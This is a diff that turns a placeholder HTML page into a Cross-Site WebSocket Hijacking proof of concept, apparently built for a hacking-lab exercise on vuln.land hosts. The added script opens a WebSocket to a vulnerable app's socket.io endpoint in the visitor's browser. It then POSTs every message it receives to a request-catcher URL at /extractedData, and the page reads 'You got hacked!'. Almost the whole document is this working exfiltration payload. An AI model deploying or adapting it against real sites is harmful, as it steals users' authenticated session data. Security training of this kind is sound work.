@@ -1,12 +1,31 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset='utf-8'>
-    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
-    <title>Change Me</title>
-    <meta name='viewport' content='width=device-width, initial-scale=1'>
-</head>
-<body>
-<h1>Change Me</h1>    
-</body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSWSH</title>
+  </head>
+  <body>
+    <h1>CSWSH</h1>
+    <p>You got hacked!</p>
+    <script type="text/javascript">
+      var socket = new WebSocket(
+        "wss://{VULNERABLE_APP https://2ee5c6cf-de7c-4882-9cc6-de6b01a2cc4f.idocker.vuln.land/debug}/socket.io/?EIO=3&transport=websocket"
+      );
+      socket.onopen = function(openEvent) {
+        console.log(openEvent);
+      };
+      socket.onmessage = function(msgEvent) {
+        console.log(msgEvent.data);
+        var oReq = new XMLHttpRequest();
+        oReq.open(
+          "POST",
+          "https://{REQUEST CATCHER https://2ee5c6cf-de7c-4882-9cc6-de6b01a2cc4f.idocker.vuln.land/debug}/extractedData"
+        );
+        oReq.send(JSON.stringify(msgEvent.data));
+      };
+      socket.onerror = function(errEvent) {
+        console.log(errEvent);
+      };
+    </script>
+  </body>
 </html>
